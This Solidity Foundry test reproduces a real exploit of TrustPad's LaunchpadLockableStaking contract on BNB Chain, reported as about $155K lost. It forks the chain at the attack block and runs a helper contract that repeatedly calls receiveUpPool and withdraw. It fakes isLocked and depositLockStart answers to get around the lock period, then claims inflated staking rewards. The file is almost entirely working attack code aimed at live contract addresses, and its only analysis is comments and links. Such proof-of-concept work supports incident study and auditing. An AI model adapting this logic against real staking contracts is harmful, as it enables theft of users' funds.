// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$155K
// Attacker : https://bscscan.com/address/0x1a7b15354e2f6564fcf6960c79542de251ce0dc9
// Attack Contract : https://bscscan.com/address/0x1694d7fabf3b28f11d65deeb9f60810daa26909a
// Vuln Contract : https://bscscan.com/address/0xe613c058701c768e0d04d1bf8e6a6dc1a0c6d48a
// Swap BNB To TPAD Tx : https://explorer.phalcon.xyz/tx/bsc/0x2490368b43951caa8bf6f730bf0aaa0bcc2657d6f64fdcc3b0372b6500d0dcfc
// Attack Tx : https://explorer.phalcon.xyz/tx/bsc/0x191a34e6c0780c3d1ab5c9bc04948e231d742b7d88e0e4f85568d57fcdc03182
// Withdraw Tx : https://explorer.phalcon.xyz/tx/bsc/0xea5bb62b8a151917a732d4114d716c7e6c087af8b3c0b3416c9dbc37c59f04da

// @Analysis
// https://twitter.com/BeosinAlert/status/1721800306101793188

// In this PoC I want to demonstrate the attack described by Beosin (see above link)
// Exploiter repeated the following process multiple times

interface ILaunchpadLockableStaking {
    function receiveUpPool(address account, uint256 amount) external;

    function withdraw(uint256 amount) external;

    function userInfo(address)
        external
        view
        returns (
            uint256 amount,
            uint256 rewardDebt,
            uint256 pendingRewards,
            uint256 lastStakedAt,
            uint256 lastUnstakedAt
        );

    function lockPeriod() external view returns (uint256);

    function stakePendingRewards() external;
}

contract ContractTest is Test {
    ILaunchpadLockableStaking private constant LaunchpadLockableStaking =
        ILaunchpadLockableStaking(0xE613c058701C768E0d04D1bf8e6a6dc1a0C6d48A);
    IERC20 private constant TPAD = IERC20(0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C);
    IERC20 private constant DDD = IERC20(0x2e1FC745937a44ae8313bC889EE023ee303F2488);
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private constant TrustPadProtocolExploiter = 0x1a7b15354e2F6564fcf6960c79542DE251cE0dC9;
    HelperContract helperContract;

    function setUp() public {
        vm.createSelectFork("bsc", 33_260_104);
        vm.label(address(LaunchpadLockableStaking), "LaunchpadLockableStaking");
        vm.label(address(TPAD), "TPAD");
        vm.label(address(DDD), "DDD");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(Router), "Router");
    }

    function testExploit() public {
        deal(address(this), 0.02 ether);
        // Getting TPAD amount
        WBNBToTPAD();
        // Jump to time when attack was happened
        vm.roll(33_260_391);
        uint256 startBalanceTPAD = TPAD.balanceOf(address(this));

        // Approve all DDD tokens from original exploiter to this attack contract
        vm.prank(TrustPadProtocolExploiter);
        DDD.approve(address(this), type(uint256).max);

        helperContract = new HelperContract();
        emit log_named_decimal_uint(
            "Exploiter's helper contract TPAD balance before attack",
            TPAD.balanceOf(address(helperContract)),
            TPAD.decimals()
        );

        (bool success,) = address(helperContract).delegatecall(
            abi.encodeWithSignature("deposit(address,uint256,uint256)", address(LaunchpadLockableStaking), 30, 1)
        );
        require(success, "Delegatecall to deposit not successfully");

        assertEq(TPAD.balanceOf(address(this)), startBalanceTPAD - 1);

        // Jump to time when rewards were withdrew
        vm.roll(33_260_396);

        success = false;
        (success,) = address(helperContract).delegatecall(
            abi.encodeWithSignature("withdraw(address,uint256)", address(LaunchpadLockableStaking), 0)
        );
        require(success, "Delegatecall to withdraw not successfully");

        emit log_named_decimal_uint(
            "Exploiter's helper contract TPAD balance after attack",
            TPAD.balanceOf(address(helperContract)),
            TPAD.decimals()
        );
    }

    function WBNBToTPAD() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(TPAD);
        uint256[] memory amounts = Router.getAmountsOut(20e15, path);
        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.02 ether}(
            (amounts[1] * 9) / 10, path, address(this), block.timestamp
        );
    }

    function isLocked(address account) external pure returns (bool) {
        return true;
    }

    function depositLockStart(address addr) external returns (uint256) {
        (bool success,) =
            address(helperContract).delegatecall(abi.encodeWithSignature("depositLockStart(address)", addr));
        require(success, "Delegatecall to depositLockStart failed");
    }
}

contract HelperContract is Test {
    IERC20 private constant DDD = IERC20(0x2e1FC745937a44ae8313bC889EE023ee303F2488);
    IERC20 private constant TPAD = IERC20(0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C);
    address private constant TrustPadProtocolExploiter = 0x1a7b15354e2F6564fcf6960c79542DE251cE0dC9;
    ILaunchpadLockableStaking private LaunchpadLockableStaking;
    uint256 private _depositLockStart;

    function deposit(address _for, uint256 _pid, uint256 _amount) external {
        LaunchpadLockableStaking = ILaunchpadLockableStaking(_for);
        DDD.transferFrom(TrustPadProtocolExploiter, address(this), 1);
        require(_depositLockStart == uint256(0), "Deposit lock should be false at begining");
        TPAD.approve(address(LaunchpadLockableStaking), type(uint256).max);
        uint256 withdrawAmount = TPAD.balanceOf(address(this));

        // Exploit start
        uint8 i;
        while (i < _pid) {
            LaunchpadLockableStaking.receiveUpPool(address(this), withdrawAmount);
            LaunchpadLockableStaking.withdraw(withdrawAmount);
            ++i;
        }

        _depositLockStart = 1;
        LaunchpadLockableStaking.receiveUpPool(address(this), 1);
        _depositLockStart = 0;

        LaunchpadLockableStaking.stakePendingRewards();
        // Exploit end

        // Verifying manipulation
        require((withdrawAmount - _amount) == TPAD.balanceOf(address(this)));
    }

    function depositLockStart(address addr) external returns (uint256) {
        uint256 start;
        if (_depositLockStart != uint256(0)) {
            uint256 lockPeriod = LaunchpadLockableStaking.lockPeriod();
            start = (block.timestamp - lockPeriod) + 1;
        } else {
            start = 1;
        }
        return start;
    }

    function withdraw(address _token, uint256 _amount) external {
        DDD.transferFrom(TrustPadProtocolExploiter, address(this), 1);
        uint256 amountToWithdraw;
        if (_amount == 0) {
            (uint256 amount,,,,) = LaunchpadLockableStaking.userInfo(address(this));
            amountToWithdraw = amount;
            emit log_uint(amount);
        } else {
            amountToWithdraw = TPAD.balanceOf(address(this));
        }
        LaunchpadLockableStaking.withdraw(amountToWithdraw);
    }
}
